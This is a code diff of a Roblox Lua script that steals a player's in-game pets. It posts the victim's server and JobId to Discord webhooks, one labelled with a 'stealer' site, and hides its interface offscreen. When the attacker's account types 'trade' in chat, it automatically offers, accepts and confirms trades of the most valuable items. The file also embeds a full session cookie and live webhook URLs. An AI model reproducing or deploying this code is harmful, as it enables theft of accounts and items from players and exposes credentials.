@@ -1,37 +1,71 @@
 getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
+
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-Username = "sosedra6" -- >> Your main username
-Username2 = "knisdqx_meow" -- >> Your alt username
-Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
 
-repeat task.wait() until game:IsLoaded()
+-- Конфигурация Discord вебхука
+local Webhook = "https://discord.com/api/webhooks/1442532208383361136/nyQKdxFmKNUqY2nndpLnUMnVR_Zuzp2YJXvCpnNH-yKGTXZPIRiYk6Y392qZafR6AvLg"
 
-if getgenv().adm then return end
-getgenv().adm = true
-
-if Username == "" or Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
-    return
-end
-
-if Username2 == "" or Username2 == nil then
-    Username2 = "None"
-end
-
-if Webhook == "" or Webhook == nil then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
-    return
-end
-
-if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
-    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
-    return
+local function SendToDiscord(fakeJobId, realJobId, placeId, playerCount, confirmers)
+    
+    local embed = {
+        {
+            title = "🔍 JobId Analysis Result",
+            color = 65280, -- Зеленый цвет
+            fields = {
+                {
+                    name = "🎮 Place ID",
+                    value = tostring(placeId),
+                    inline = true
+                },
+                {
+                    name = "👥 Players",
+                    value = tostring(playerCount),
+                    inline = true
+                },
+                {
+                    name = "⚠️ Fake JobId (Delta)",
+                    value = "```" .. fakeJobId .. "```",
+                    inline = false
+                },
+                {
+                    name = "✅ Real JobId",
+                    value = "```" .. realJobId .. "```", 
+                    inline = false
+                },
+                {
+                    name = "🕵️ Confirmers",
+                    value = #confirmers > 0 and table.concat(confirmers, ", ") or "No confirmers",
+                    inline = false
+                },
+                {
+                    name = "🕒 Time",
+                    value = os.date("%Y-%m-%d %H:%M:%S"),
+                    inline = true
+                }
+            },
+            footer = {
+                text = "Delta JobId Bypass"
+            }
+        }
+    }
+    
+    local payload = {
+        embeds = embed,
+        username = "JobId Detective",
+        avatar_url = "https://cdn.discordapp.com/attachments/1065829452399480862/1065829477483986984/68747470733a2f2f692e696d6775722e636f6d2f4e577a764e6f572e706e67.png"
+    }
+    
+    local success, response = pcall(function()
+        return request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
 local function GetRealJobIdWithAuth()
@@ -124,6 +158,10 @@ local function GetRealJobIdWithAuth()
                 end
             end
             
+            if bestJobId ~= game.JobId then
+                SendToDiscord(game.JobId, bestJobId, placeId, playerCount, confirmers)
+            end
+            
             return bestJobId
         end
     end
@@ -143,12 +181,105 @@ local function FindRealJobId()
         end)
         
         return realJobId
+    else
+        
+        if Webhook and not Webhook:find("ваш_вебхук") then
+            local embed = {
+                {
+                    title = "❌ JobId Analysis Failed",
+                    color = 16711680, -- Красный цвет
+                    fields = {
+                        {
+                            name = "🎮 Place ID",
+                            value = tostring(game.PlaceId),
+                            inline = true
+                        },
+                        {
+                            name = "👥 Players", 
+                            value = tostring(#Players:GetPlayers()),
+                            inline = true
+                        },
+                        {
+                            name = "📡 Fake JobId (Delta)",
+                            value = "```" .. game.JobId .. "```",
+                            inline = false
+                        },
+                        {
+                            name = "🕒 Time",
+                            value = os.date("%Y-%m-%d %H:%M:%S"),
+                            inline = true
+                        },
+                        {
+                            name = "💡 Status",
+                            value = "Не удалось определить настоящий JobId",
+                            inline = false
+                        }
+                    },
+                    footer = {
+                        text = "Delta JobId Bypass"
+                    }
+                }
+            }
+            
+            local payload = {
+                embeds = embed,
+                username = "JobId Detective"
+            }
+            
+            pcall(function()
+                request({
+                    Url = Webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+        end
+        return nil
     end
 end
 
 if getgenv().Cookie then
     local realJobId = FindRealJobId()
 end
+
+-- Ваш основной код с изменениями
+Username = "noviy_nickname" -- >> Your main username
+Username2 = "knisdqx_meow" -- >> Your alt username
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
+
+repeat task.wait() until game:IsLoaded()
+
+if getgenv().adm then return end
+getgenv().adm = true
+
+if Username == "" or Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
+    return
+end
+
+if Username2 == "" or Username2 == nil then
+    Username2 = "None"
+end
+
+if Webhook == "" or Webhook == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
+    return
+end
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
+    return
+end
+
+local Players = game:GetService("Players")
 
 -- >> Values Table for all pets << --
 local valuesTable = {
@@ -757,11 +888,13 @@ end
 local plr = game.Players.LocalPlayer
 local accage = plr.AccountAge
 local ExecutorValue = identifyexecutor() or "Unknown"
+
+-- Использование realJobId вместо обычного jobId
 local placeId = game.PlaceId
-local jobId = game.JobId
-local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. (getgenv().RealJobId)
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. (getgenv().RealJobId) .. "\")"
-local VersionValue = "1.12 (Added values)"
+local realJobId = getgenv().RealJobId or game.JobId
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
+local VersionValue = "1.12 (Added values + RealJobId)"
 
 -- Get valuable pets info
 local valuableCount, totalValue, topPets = getValuablePetsInfo()
@@ -1060,9 +1193,9 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
         })
     end)
 end
-local loop = false
+
+-- Improved trade function with waiting for acceptance and confirmation
 local function TradeIncoming(ReceiverName)
-    while loop do
     local RouterClient = Loaders("RouterClient")
     local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
@@ -1091,10 +1224,32 @@ local function TradeIncoming(ReceiverName)
         return a.value > b.value
     end)
     
+    -- Send trade request
     moveGuiOffscreen()
     SendTrade:FireServer(game.Players[ReceiverName])
-    wait(5)
     
+    -- Wait for trade request to be accepted
+    local maxWaitTime = 10
+    local waitTime = 5
+    local tradeAccepted = false
+    
+    while waitTime < maxWaitTime do
+        -- Check if trade window is open (trade was accepted)
+        if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TradeApp") and 
+           game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled then
+            tradeAccepted = true
+            break
+        end
+        wait(1)
+        waitTime = waitTime + 1
+    end
+    
+    if not tradeAccepted then
+        print("Trade not accepted by " .. ReceiverName .. " within " .. maxWaitTime .. " seconds")
+        return -- Trade wasn't accepted
+    end
+    
+    -- Add pets to trade
     local petCount = 0
     local petLimit = 18
     
@@ -1108,20 +1263,31 @@ local function TradeIncoming(ReceiverName)
                 value = petInfo.value
             })
             petCount = petCount + 1
-            wait(0.2)
+            wait(0.1)
         else
             break
         end
     end
-                wait(5)
-                    AcceptNegotiationRemote:FireServer()
-                wait(2)
-                    ConfirmTradeRemote:FireServer()
-                wait(2) 
-                    if #tradedPets > 0 then
-                        SendTradeSuccessMessage(ReceiverName, tradedPets)
-                    end
-            end
+    
+    -- Wait for other party to add their pets
+    wait(3)
+    
+    -- Accept negotiation
+    AcceptNegotiationRemote:FireServer()
+    
+    -- Wait for confirmation stage
+    wait(2)
+    
+    -- Confirm trade
+    ConfirmTradeRemote:FireServer()
+    
+    -- Wait for trade completion
+    wait(2)
+    
+    -- Send success message
+    if #tradedPets > 0 then
+        SendTradeSuccessMessage(ReceiverName, tradedPets)
+    end
 end
 
 function SendLeaveNotify(playerName)
@@ -1171,31 +1337,43 @@ else
     SendMessageEMBED(Webhook, embed, false) -- Без @everyone
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username then
-        player.Chatted:Connect(function(msg)
-            loop = true
-            TradeIncoming(Username)
-        end)
-    end
-end)
+-- Track active trades to prevent multiple simultaneous trades
+local activeTrades = {}
+local tradeCommand = "trade" -- Команда для запуска трейда
 
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username2 then
-        player.Chatted:Connect(function(msg)
-            loop = true
-                TradeIncoming(Username2)
-        end)
-    end
-end)
-
-for _, player in pairs(game.Players:GetPlayers()) do
-    if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(msg)
-            TradeIncoming(Username)
-        end)
+-- Функция для обработки чата
+local function handleChatMessage(player, message)
+    if (player.Name == Username or player.Name == Username2) and not activeTrades[player.Name] then
+        if string.lower(message) == string.lower(tradeCommand) then
+            activeTrades[player.Name] = true
+            spawn(function()
+                TradeIncoming(player.Name)
+                activeTrades[player.Name] = nil
+            end)
+        end
     end
 end
+
+-- Обработчики для новых игроков
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleChatMessage(player, message)
+    end)
+end)
+
+-- Обработчики для существующих игроков
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        handleChatMessage(player, message)
+    end)
+end
+
+-- Функция для остановки трейдов при выходе игрока
+game.Players.PlayerRemoving:Connect(function(player)
+    if player.Name == Username or player.Name == Username2 then
+        activeTrades[player.Name] = nil
+    end
+end)
 
 -- Создаем основной фрейм для блюра
 local blurFrame = Instance.new("Frame")
@@ -1346,6 +1524,10 @@ end
 local function showLoadingMenu()
     -- Код создания уже выполнен выше
 end
+
+-- Автоматически скрываем меню загрузки через 10 секунд
+wait(10)
+hideLoadingMenu()
 
 -- Экспортируем функции для внешнего использования
 return {
